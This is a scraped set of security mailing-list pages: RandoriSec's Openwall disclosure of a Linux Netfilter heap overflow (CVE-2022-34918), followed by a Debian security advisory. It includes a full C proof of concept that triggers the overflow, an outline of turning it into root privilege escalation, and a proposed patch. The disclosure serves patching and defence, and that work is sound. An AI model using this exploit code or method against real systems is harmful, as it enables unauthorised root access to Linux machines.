> ??? attr = set_nested_attr(attr, NFTA_SET_ELEM_LIST_ELEMENTS,
> nested_attr_size);
>
> ??? attr = set_nested_attr(attr, 0, nested_attr_size - 4);
> ??? attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY,
> NLA_BIN_SIZE(set_keylen));
> ??? attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)buffer,
> set_keylen);
> ??? attr = set_nested_attr(attr, NFTA_SET_ELEM_DATA, U32_NLA_SIZE +
> sizeof(struct nlattr));
> ??? attr = set_nested_attr(attr, NFTA_DATA_VERDICT, U32_NLA_SIZE);
> ??? set_u32_attr(attr, NFTA_VERDICT_CODE, NFT_CONTINUE);
>
> ??? /* Last netlink message: End of batch */
> ??? nlh_batch_end = get_batch_end_nlmsg();
>
> ??? /* Setup the iovec */
> ??? memset(iov, 0, sizeof(struct iovec) * 3);
> ??? iov[0].iov_base = (void *)nlh_batch_begin;
> ??? iov[0].iov_len = nlh_batch_begin->nlmsg_len;
> ??? iov[1].iov_base = (void *)nlh_payload;
> ??? iov[1].iov_len = nlh_payload->nlmsg_len;
> ??? iov[2].iov_base = (void *)nlh_batch_end;
> ??? iov[2].iov_len = nlh_batch_end->nlmsg_len;
>
> ??? /* Prepare the message to send */
> ??? memset(&msg, 0, sizeof(struct msghdr));
> ??? msg.msg_name = (void *)&dest_snl;
> ??? msg.msg_namelen = sizeof(struct sockaddr_nl);
> ??? msg.msg_iov = iov;
> ??? msg.msg_iovlen = 3;
>
> ??? /* Send message */
> ??? sendmsg(sock, &msg, 0);
>
> ??? /* Free allocated memory */
> ??? free(nlh_batch_end);
> ??? free(nlh_payload);
> ??? free(nlh_batch_begin);
> }
>
> int main(int argc, char **argv) {
>
> ??? int sock;
> ??? struct sockaddr_nl snl;
> ??? struct leak *bases;
>
> ??? new_ns();
> ??? printf("[+] Get CAP_NET_ADMIN capability\n");
>
> ??? /* Netfilter netlink socket creation */
> ??? if ((sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) < 0) {
> ??????? do_error_exit("socket");
> ??? }
> ??? printf("[+] Netlink socket created\n");
>
> ??? // Binding
> ??? memset(&snl, 0, sizeof(snl));
> ??? snl.nl_family = AF_NETLINK;
> ??? snl.nl_pid = getpid();
> ??? if (bind(sock, (struct sockaddr *)&snl, sizeof(snl)) < 0) {
> ??????? do_error_exit("bind");
> ??? }
> ??? printf("[+] Netlink socket bound\n");
>
> ??? /* Create a netfilter table */
> ??? create_table(sock, TABLE);
> ??? printf("[+] Table created\n");
>
> ??? /*? Create a netfilter set */
> ??? create_set(sock, SET_NAME, KMALLOC64_KEYLEN, BUFFER_SIZE, TABLE, ID);
> ??? printf("[+] Set created\n");
>
> ??? /* Prepare the payload for the write primitive */
> ??? add_elem_to_set(sock, SET_NAME, KMALLOC64_KEYLEN, TABLE, ID,
> BUFFER_SIZE, buffer);
> ??? printf("[+] Overflow done\n");
>
> ??? return EXIT_SUCCESS;
> }
> ```
>
> We propose the following patch. We think that the comparison must be
> mandatory and may be enough for patch this vulnerability.
> However, we are not experts at Linux kernel programming and we are still
> unsure if it will not break something along the way.
> This patch was applied on the current upstream version.
>
> ```diff
> static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
> ????????????????? struct nft_data_desc *desc,
> ????????????????? struct nft_data *data,
> ????????????????? struct nlattr *attr)
> {
>
> ??? ...
>
> -??? if (desc->type != NFT_DATA_VERDICT && desc->len != set->dlen) {
> +??? if (desc->len != set->dlen) {
>
> ?? ???? ??? ??? nft_data_release(data, desc->type);
> ??????? return -EINVAL;
> ??? }
>
> ??? return 0;
> }
> ```
>
> We would like to reserve a CVE for this vulnerability.
>
> Also, we would like to release the LPE exploit targeting Ubuntu server
> along with a more detailed blogpost.
> If needed, we can supply the exploit. Depending of your workload, we can
> suggest the August, 15th 2022 as a potential date for public disclosure.
>
> Thank you for your attention and we also would like to thank you for all
> the work put on the Linux kernel.
>
> ----- End forwarded message -----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from packetstormsecurity.com_5b75b2a1_20250108_134522.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.openwall.com_0d05f2b7_20250108_134525.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](2) [[next>]](../../../2022/07/03/1) [[<thread-prev]](2) [[thread-next>]](../../../2022/07/03/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20220702215539.GA14413@openwall.com>
Date: Sat, 2 Jul 2022 23:55:40 +0200
From: Solar Designer <solar@...nwall.com>
To: oss-security@...ts.openwall.com
Cc: Hugues ANGUELKOV <hanguelkov@...dorisec.fr>
Subject: Re: Linux kernel: Netfilter heap buffer overflow in nft_set_elem_init

On Sat, Jul 02, 2022 at 09:37:46PM +0200, Solar Designer wrote:
> The message below was meant to start an embargo for the issue, but it
> was CC'ed to netfilter-devel, which is a public mailing list, so it also
> appears here:
>
> [https://lore.kernel.org/netfilter-devel/cd9428b6-7ffb-dd22-d949-d86f4869f452@randorisec.fr/T/#u](https://lore.kernel.org/netfilter-devel/cd9428b6-7ffb-dd22-d949-d86f4869f452%40randorisec.fr/T/#u)

I'm sorry I got the encoding wrong, breaking the non-breaking spaces.
Let me try again, below.  (Not trying to fix the line wrapping, which
would be too invasive an edit to make to someone else's message.)

----- Forwarded message from Hugues ANGUELKOV <hanguelkov@...dorisec.fr> -----

Date: Fri, 1 Jul 2022 17:43:16 +0200
To: linux-distros
Cc: security, pablo, kadlec, fw, netfilter-devel, coreteam, davy, amongodin
From: Hugues ANGUELKOV <hanguelkov@...dorisec.fr>
Subject: [vs] Netfilter vulnerability disclosure

Hello everyone,

One of our collaborators at RandoriSec, Arthur Mongodin found a
vulnerability within the netfilter subsystem during his internship.
Successful exploitation of this bug leads to a Local Privilege
Escalation (LPE) to the `root` user, as tested on Ubuntu server 22.04
(Linux 5.15.0-39-generic).
This vulnerability is a heap buffer overflow due to a weak check and has
been introduced within the commit
[fdb9c405e35bdc6e305b9b4e20ebc141ed14fc81](<https://github.com/torvalds/linux/commit/fdb9c405e35bdc6e305b9b4e20ebc141ed14fc81>),
it affects the Linux kernel since the version 5.8 and is still present today.

The heap buffer overflow happens in the function `nft_set_elem_init`
(`/net/netfilter/nf_tables_api.c`)

```c
void *nft_set_elem_init(const struct nft_set *set,
            const struct nft_set_ext_tmpl *tmpl,
            const u32 *key, const u32 *key_end,
            const u32 *data, u64 timeout, u64 expiration, gfp_t gfp)
{
    struct nft_set_ext *ext;
    void *elem;

    elem = kzalloc(set->ops->elemsize + tmpl->len,
gfp);                    <===== (0)
    if (elem == NULL)
        return NULL;

    ...

    if (nft_set_ext_exists(ext, NFT_SET_EXT_DATA))
        memcpy(nft_set_ext_data(ext), data,
set->dlen);                     <===== (1)

    ...

    return elem;
}
```

A buffer is allocated at (0) without taking in consideration the value
`set->dlen` used at (1) for the copy.
The computation of the needed space (`tmpl->len`) is realized before the
call to `nft_set_elem_init`, however,
 a weak check on a user input allows a user to provide an element with
a data length lower than the `set->dlen` for the allocation.
This check is located within the function `nft_set_elem_parse_data`
(`/net/netfilter/nf_tables_api.c`).

```c
static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
                  struct nft_data_desc *desc,
                  struct nft_data *data,
                  struct nlattr *attr)
{

    ...

    if (desc->type != NFT_DATA_VERDICT && desc->len != set->dlen)
{         <===== (2)
        nft_data_release(data, desc->type);
        return -EINVAL;
    }

    return 0;
}
```

As we can see at (2), if the data type is `NFT_DATA_VERDICT`, the
comparison between `desc->len` and `set->dlen` is not done.
Finally, `desc->len` it is used to compute `tmpl->len` at (0) and
`set->dlen` for the copy at (1) and they can be different.

The vulnerable code path can be reached if the kernel is built with the
configuration `CONFIG_NETFILTER`, `CONFIG_NF_TABLES` enabled.
To exploit the vulnerability, an attacker may need to obtain an
unprivileged user namespace to gain the capability `CAP_NET_ADMIN`
(`CONFIG_USER_NS` and `CONFIG_NET_NS` enabled, and
`kernel.unprivileged_userns_clone = 1`).

The exploitation was simplified by the use of an uninitialized variable
in `nft_add_set_elem`:

```c
static int nft_add_set_elem(struct nft_ctx *ctx, struct nft_set *set,
const struct nlattr *attr, u32 nlmsg_flags)
{
  struct nft_set_elem elem;
  ...
}
```

First we add an `elem` with the type `NFT_DATA_VALUE`, then `elem.data`
will be filled `set->dlen` bytes, the second iteration will only erase
the first bytes of `elem.data` with an element of type `NFT_DATA_VERDICT`.

We get an infoleak by overwriting the field `datalen` of
an`user_key_payload` structure. The write primitive can be obtained with
an unlinking attack on the `list_head` of the `simple_xattr` structure.
We targeted the `modprobe_path` to gain root permission by executing a
shell wrapper.

The following Proof of Concept (PoC) will trigger KASAN on the upstream
kernel (Linux 5.19.0-rc4)

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <arpa/inet.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>

#define do_error_exit(msg) do {perror("[-] " msg); exit(EXIT_FAILURE); }
while(0)

#define ID 1337
#define SET_NAME "name\0\0\0"
#define LEAK_SET_NAME "leak\0\0\0"
#define TABLE "table\0\0"

#define U32_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint32_t))
#define U64_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint64_t))
#define S8_NLA_SIZE (sizeof(struct nlattr) + 8)
#define NLA_BIN_SIZE(x) (sizeof(struct nlattr) + x)
#define NLA_ATTR(attr) ((void *)attr + NLA_HDRLEN)

#define TABLEMSG_SIZE NLMSG_SPACE(sizeof(struct nfgenmsg) +
sizeof(struct nlattr) + 8)

#define KMALLOC64_KEYLEN (64 - 8 - 12 - 16) // Max size - elemsize -
sizeof(nft_set_ext)(align) - min datasize

#define BUFFER_SIZE 64

uint8_t buffer[BUFFER_SIZE] = {0};

void new_ns(void) {

    if (unshare(CLONE_NEWUSER))
        do_error_exit("unshare(CLONE_NEWUSER)");

    if (unshare(CLONE_NEWNET))
        do_error_exit("unshare(CLONE_NEWNET)");
}

struct nlmsghdr *get_batch_begin_nlmsg(void) {

    struct nlmsghdr *nlh = (struct nlmsghdr
*)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
    struct nfgenmsg *nfgm = (struct nfgenmsg *)NLMSG_DATA(nlh);

    if (!nlh)
        do_error_exit("malloc");

    memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
    nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
    nlh->nlmsg_type = NFNL_MSG_BATCH_BEGIN;
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = 0;
    nlh->nlmsg_seq = 0;

    /* Used to access to the netfilter tables subsystem */
    nfgm->res_id = NFNL_SUBSYS_NFTABLES;

    return nlh;
}

struct nlmsghdr *get_batch_end_nlmsg(void) {

    struct nlmsghdr *nlh = (struct nlmsghdr
*)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));

    if (!nlh)
        do_error_exit("malloc");

    memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
    nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
    nlh->nlmsg_type = NFNL_MSG_BATCH_END;
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 0;

    return nlh;
}

struct nlattr *set_nested_attr(struct nlattr *attr, uint16_t type,
uint16_t data_len) {
    attr->nla_type = type;
    attr->nla_len = NLA_ALIGN(data_len + sizeof(struct nlattr));
    return (void *)attr + sizeof(struct nlattr);
}

struct nlattr *set_u32_attr(struct nlattr *attr, uint16_t type, uint32_t
value) {
    attr->nla_type = type;
    attr->nla_len = U32_NLA_SIZE;
    *(uint32_t *)NLA_ATTR(attr) = htonl(value);

    return (void *)attr + U32_NLA_SIZE;
}

struct nlattr *set_str8_attr(struct nlattr *attr, uint16_t type, const
char name[8]) {
    attr->nla_type = type;
    attr->nla_len = S8_NLA_SIZE;
    memcpy(NLA_ATTR(attr), name, 8);

    return (void *)attr + S8_NLA_SIZE;
}

struct nlattr *set_binary_attr(struct nlattr *attr, uint16_t type,
uint8_t *buffer, uint64_t buffer_size) {
    attr->nla_type = type;
    attr->nla_len = NLA_BIN_SIZE(buffer_size);
    memcpy(NLA_ATTR(attr), buffer, buffer_size);

    return (void *)attr + NLA_ALIGN(NLA_BIN_SIZE(buffer_size));
}
void create_table(int sock, const char *name) {
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();

    /* Netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(TABLEMSG_SIZE);
    if (!nlh)
        do_error_exit("malloc");

    memset(nlh, 0, TABLEMSG_SIZE);
    nlh->nlmsg_len = TABLEMSG_SIZE;
    nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE;
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 0;

    nfm = NLMSG_DATA(nlh);
    nfm->nfgen_family = NFPROTO_INET;

    /** Prepare associated attribute **/
    attr = (void *)nlh + NLMSG_SPACE(sizeof(struct nfgenmsg));
    set_str8_attr(attr, NFTA_TABLE_NAME, name);

    /* Netlink batch_end message preparation */
    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh_batch_begin;
    iov[0].iov_len = nlh_batch_begin->nlmsg_len;
    iov[1].iov_base = (void *)nlh;
    iov[1].iov_len = nlh->nlmsg_len;
    iov[2].iov_base = (void *)nlh_batch_end;
    iov[2].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 3;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh);
    free(nlh_batch_begin);
}

void create_set(int sock, const char *set_name, uint32_t set_keylen,
uint32_t data_len, const char *table_name, uint32_t id) {
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_payload;
    struct nlmsghdr *nlh_batch_end;
    struct nfgenmsg *nfm;
    struct nlattr *attr;
    uint64_t nlh_payload_size;
    struct iovec iov[3];

    /* Prepare the netlink sockaddr for msg */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;

    /* First netlink message: batch_begin */
    nlh_batch_begin = get_batch_begin_nlmsg();

    /* Second netlink message : Set attributes */
    nlh_payload_size = sizeof(struct
nfgenmsg);                                     // Mandatory
    nlh_payload_size +=
S8_NLA_SIZE;                                                //
NFTA_SET_TABLE
    nlh_payload_size +=
S8_NLA_SIZE;                                                // NFTA_SET_NAME
    nlh_payload_size +=
U32_NLA_SIZE;                                               // NFTA_SET_ID
    nlh_payload_size +=
U32_NLA_SIZE;                                               //
NFTA_SET_KEY_LEN
    nlh_payload_size +=
U32_NLA_SIZE;                                               //
NFTA_SET_FLAGS
    nlh_payload_size +=
U32_NLA_SIZE;                                               //
NFTA_SET_DATA_TYPE
    nlh_payload_size +=
U32_NLA_SIZE;                                               //
NFTA_SET_DATA_LEN
    nlh_payload_size = NLMSG_SPACE(nlh_payload_size);

    /** Allocation **/
    nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
    if (!nlh_payload)
        do_error_exit("malloc");

    memset(nlh_payload, 0, nlh_payload_size);

    /** Fill the required fields **/
    nlh_payload->nlmsg_len = nlh_payload_size;
    nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET;
    nlh_payload->nlmsg_pid = getpid();
    nlh_payload->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
    nlh_payload->nlmsg_seq = 0;

    /** Setup the nfgenmsg **/
    nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
    nfm->nfgen_family =
NFPROTO_INET;                                               // Verify if
it is compulsory

    /** Setup the attributes */
    attr = (struct nlattr *)((void *)nlh_payload +
NLMSG_SPACE(sizeof(struct nfgenmsg)));
    attr = set_str8_attr(attr, NFTA_SET_TABLE, table_name);
    attr = set_str8_attr(attr, NFTA_SET_NAME, set_name);
    attr = set_u32_attr(attr, NFTA_SET_ID, id);
    attr = set_u32_attr(attr, NFTA_SET_KEY_LEN, set_keylen);
    attr = set_u32_attr(attr, NFTA_SET_FLAGS, NFT_SET_MAP);
    attr = set_u32_attr(attr, NFTA_SET_DATA_TYPE, 0);
    set_u32_attr(attr, NFTA_SET_DATA_LEN, data_len);

    /* Last netlink message: batch_end */
    nlh_batch_end = get_batch_end_nlmsg();

    /* Setup the iovec */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh_batch_begin;
    iov[0].iov_len = nlh_batch_begin->nlmsg_len;
    iov[1].iov_base = (void *)nlh_payload;
    iov[1].iov_len = nlh_payload->nlmsg_len;
    iov[2].iov_base = (void *)nlh_batch_end;
    iov[2].iov_len = nlh_batch_end->nlmsg_len;

    /* Prepare the message to send */
    memset(&msg, 0, sizeof(struct msghdr));
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 3;

    /* Send message */
    sendmsg(sock, &msg, 0);

    /* Free allocated memory */
    free(nlh_batch_end);
    free(nlh_payload);
    free(nlh_batch_begin);
}

void add_elem_to_set(int sock, const char *set_name, uint32_t
set_keylen, const char *table_name, uint32_t id, uint32_t data_len,
uint8_t *data) {
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_payload;
    struct nlmsghdr *nlh_batch_end;
    struct nfgenmsg *nfm;
    struct nlattr *attr;
    uint64_t nlh_payload_size;
    uint64_t nested_attr_size;
    struct iovec iov[3];

    /* Prepare the netlink sockaddr for msg */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;

    /* First netlink message: batch */
    nlh_batch_begin = get_batch_begin_nlmsg();

    /* Second netlink message : Set attributes */

    /** Precompute the size of the nested field **/
    nested_attr_size = 0;

    nested_attr_size += sizeof(struct
nlattr);                                      // Englobing attribute
    nested_attr_size += sizeof(struct
nlattr);                                      // NFTA_SET_ELEM_KEY
    nested_attr_size +=
NLA_BIN_SIZE(set_keylen);                                      //
NFTA_DATA_VALUE
    nested_attr_size += sizeof(struct
nlattr);                                      // NFTA_SET_ELEM_DATA
    nested_attr_size += sizeof(struct
nlattr);                                      // NFTA_DATA_VERDICT
    nested_attr_size +=
U32_NLA_SIZE;                                               //
NFTA_VERDICT_CODE

    nlh_payload_size = sizeof(struct
nfgenmsg);                                     // Mandatory
    nlh_payload_size += sizeof(struct
nlattr);                                      // NFTA_SET_ELEM_LIST_ELEMENTS
    nlh_payload_size +=
nested_attr_size;                                           // All the
stuff described above
    nlh_payload_size +=
S8_NLA_SIZE;                                                //
NFTA_SET_ELEM_LIST_TABLE
    nlh_payload_size +=
S8_NLA_SIZE;                                                //
NFTA_SET_ELEM_LIST_SET
    nlh_payload_size +=
U32_NLA_SIZE;                                               //
NFTA_SET_ELEM_LIST_SET_ID
    nlh_payload_size = NLMSG_SPACE(nlh_payload_size);

    /** Allocation **/
    nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
    if (!nlh_payload) {
        do_error_exit("malloc");
    }
    memset(nlh_payload, 0, nlh_payload_size);

    /** Fill the required fields **/
    nlh_payload->nlmsg_len = nlh_payload_size;
    nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) |
NFT_MSG_NEWSETELEM;
    nlh_payload->nlmsg_pid = getpid();
    nlh_payload->nlmsg_flags = NLM_F_REQUEST;
    nlh_payload->nlmsg_seq = 0;

    /** Setup the nfgenmsg **/
    nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
    nfm->nfgen_family = NFPROTO_INET;

    /** Setup the attributes */
    attr = (struct nlattr *)((void *)nlh_payload +
NLMSG_SPACE(sizeof(struct nfgenmsg)));
    attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_TABLE, table_name);
    attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_SET, set_name);
    attr = set_u32_attr(attr, NFTA_SET_ELEM_LIST_SET_ID, id);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_LIST_ELEMENTS,
nested_attr_size);

    attr = set_nested_attr(attr, 0, nested_attr_size - 4);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY,
NLA_BIN_SIZE(set_keylen));
    attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)buffer,
set_keylen);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_DATA, U32_NLA_SIZE +
sizeof(struct nlattr));
    attr = set_nested_attr(attr, NFTA_DATA_VERDICT, U32_NLA_SIZE);
    set_u32_attr(attr, NFTA_VERDICT_CODE, NFT_CONTINUE);

    /* Last netlink message: End of batch */
    nlh_batch_end = get_batch_end_nlmsg();

    /* Setup the iovec */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh_batch_begin;
    iov[0].iov_len = nlh_batch_begin->nlmsg_len;
    iov[1].iov_base = (void *)nlh_payload;
    iov[1].iov_len = nlh_payload->nlmsg_len;
    iov[2].iov_base = (void *)nlh_batch_end;
    iov[2].iov_len = nlh_batch_end->nlmsg_len;

    /* Prepare the message to send */
    memset(&msg, 0, sizeof(struct msghdr));
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 3;

    /* Send message */
    sendmsg(sock, &msg, 0);

    /* Free allocated memory */
    free(nlh_batch_end);
    free(nlh_payload);
    free(nlh_batch_begin);
}

int main(int argc, char **argv) {

    int sock;
    struct sockaddr_nl snl;
    struct leak *bases;

    new_ns();
    printf("[+] Get CAP_NET_ADMIN capability\n");

    /* Netfilter netlink socket creation */
    if ((sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) < 0) {
        do_error_exit("socket");
    }
    printf("[+] Netlink socket created\n");

    // Binding
    memset(&snl, 0, sizeof(snl));
    snl.nl_family = AF_NETLINK;
    snl.nl_pid = getpid();
    if (bind(sock, (struct sockaddr *)&snl, sizeof(snl)) < 0) {
        do_error_exit("bind");
    }
    printf("[+] Netlink socket bound\n");

    /* Create a netfilter table */
    create_table(sock, TABLE);
    printf("[+] Table created\n");

    /*  Create a netfilter set */
    create_set(sock, SET_NAME, KMALLOC64_KEYLEN, BUFFER_SIZE, TABLE, ID);
    printf("[+] Set created\n");

    /* Prepare the payload for the write primitive */
    add_elem_to_set(sock, SET_NAME, KMALLOC64_KEYLEN, TABLE, ID,
BUFFER_SIZE, buffer);
    printf("[+] Overflow done\n");

    return EXIT_SUCCESS;
}
```

We propose the following patch. We think that the comparison must be
mandatory and may be enough for patch this vulnerability.
However, we are not experts at Linux kernel programming and we are still
unsure if it will not break something along the way.
This patch was applied on the current upstream version.

```diff
static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
                  struct nft_data_desc *desc,
                  struct nft_data *data,
                  struct nlattr *attr)
{

    ...

-    if (desc->type != NFT_DATA_VERDICT && desc->len != set->dlen) {
+    if (desc->len != set->dlen) {

                nft_data_release(data, desc->type);
        return -EINVAL;
    }

    return 0;
}
```

We would like to reserve a CVE for this vulnerability.

Also, we would like to release the LPE exploit targeting Ubuntu server
along with a more detailed blogpost.
If needed, we can supply the exploit. Depending of your workload, we can
suggest the August, 15th 2022 as a potential date for public disclosure.

Thank you for your attention and we also would like to thank you for all
the work put on the Linux kernel.

----- End forwarded message -----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.debian.org_165337c9_20250108_134524.html ===


---

[[Date Prev](msg00159.html)][[Date Next](msg00161.html)]
[[Thread Prev](msg00159.html)][[Thread Next](msg00161.html)]
[[Date Index](maillist.html#00160)]
[[Thread Index](threads.html#00160)]

# [SECURITY] [DSA 5191-1] linux security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 5191-1] linux security update
* *From*: Moritz Muehlenhoff <jmm@debian.org>
* *Date*: Tue, 26 Jul 2022 20:07:34 +0000
* *Message-id*: <[[🔎]](/msgid-search/20220726200734.GA5805%40seger.debian.org) [20220726200734.GA5805@seger.debian.org](msg00160.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-5191-1                   security@debian.org
<https://www.debian.org/security/>                       Moritz Muehlenhoff
July 26, 2022                         <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : linux
CVE ID         : CVE-2021-33655 CVE-2022-2318 CVE-2022-26365 CVE-2022-33740
                 CVE-2022-33741 CVE-2022-33742 CVE-2022-33743 CVE-2022-33744
                 CVE-2022-34918

Several vulnerabilities have been discovered in the Linux kernel that may
lead to privilege escalation, denial of service or information leaks:

CVE-2021-33655

    A user with access to a framebuffer console driver could cause a
    memory out-of-bounds write via the FBIOPUT_VSCREENINFO ioctl.

CVE-2022-2318

    A use-after-free in the Amateur Radio X.25 PLP (Rose) support may
    result in denial of service.

CVE-2022-26365 / CVE-2022-33740 / CVE-2022-33741 / CVE-2022-33742

    Roger Pau Monne discovered that Xen block and network PV device
    frontends don't zero out memory regions before sharing them with the
    backend, which may result in information disclosure. Additionally it
    was discovered that the granularity of the grant table doesn't permit
    sharing less than a 4k page, which may also result in information
    disclosure.

CVE-2022-33743

    Jan Beulich discovered that incorrect memory handling in the Xen
    network backend may lead to denial of service.

CVE-2022-33744

    Oleksandr Tyshchenko discovered that ARM Xen guests can cause a denial
    of service to the Dom0 via paravirtual devices.

CVE-2022-34918

    Arthur Mongodin discovered a heap buffer overflow in the Netfilter
    subsystem which may result in local privilege escalation.

For the stable distribution (bullseye), these problems have been fixed in
version 5.10.127-2.

